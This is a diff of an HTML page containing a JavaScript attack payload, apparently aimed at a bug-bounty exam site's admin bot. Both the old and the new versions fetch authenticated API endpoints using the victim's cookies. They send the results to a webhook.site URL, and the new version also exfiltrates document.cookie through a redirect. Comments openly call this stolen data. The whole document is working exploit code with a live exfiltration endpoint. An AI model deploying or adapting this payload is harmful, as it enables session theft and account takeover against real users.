@@ -1,53 +1,25 @@
 <!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <title>System Diagnostic</title>
-</head>
+<html>
 <body>
-    <h1>Processing Request...</h1>
     <script>
-        const logger = "https://webhook.site/cf21c05b-bed9-4997-b070-c2d39306cd13";
-        const apiBase = "https://api-bugbounty-exam.hashacademy.co";
+        const webhook = "https://webhook.site/cf21c05b-bed9-4997-b070-c2d39306cd13";
+        const target = "https://api-bugbounty-exam.hashacademy.co/api/auth/me";
 
-        async function findSecret() {
-            const endpoints = [
-                { name: "AUTH_ME", url: "/api/auth/me" },
-                { name: "ADMIN_SETTINGS", url: "/api/admin/settings" },
-                { name: "ADMIN_CARS", url: "/api/admin/cars" }
-            ];
-
-            for (const endpoint of endpoints) {
-                try {
-                    const res = await fetch(apiBase + endpoint.url, {
-                        method: "GET",
-                        credentials: "include" // This is key to use the AdminBot's cookies
-                    });
-                    
-                    const data = await res.json();
-
-                    // Send the stolen data to your webhook
-                    await fetch(logger, {
-                        method: "POST",
-                        mode: "no-cors", // Ensures the request goes through even if CORS is strict
-                        body: JSON.stringify({ 
-                            source: endpoint.name, 
-                            content: data 
-                        })
-                    });
-                } catch (e) {
-                    // Log error to webhook to see if the fetch is failing
-                    fetch(logger + "?error=" + endpoint.name);
-                }
-            }
+        // We use fetch but immediately follow up with a location change
+        fetch(target, {credentials: "include"})
+            .then(r => r.text())
+            .then(data => {
+                // This forces the bot to go to your webhook with the data in the URL
+                window.location.href = webhook + "?stolen_data=" + btoa(data);
+            })
+            .catch(err => {
+                window.location.href = webhook + "?error=" + btoa(err);
+            });
             
-            // Final redirection to a real page to avoid suspicious bot behavior
-            setTimeout(() => {
-                window.location.href = "https://bugbounty-exam.hashacademy.co/dashboard";
-            }, 2000);
-        }
-
-        findSecret();
+        // Fallback: If fetch fails, just try to grab the cookie directly
+        setTimeout(() => {
+            window.location.href = webhook + "?cookie=" + btoa(document.cookie);
+        }, 2000);
     </script>
 </body>
 </html>
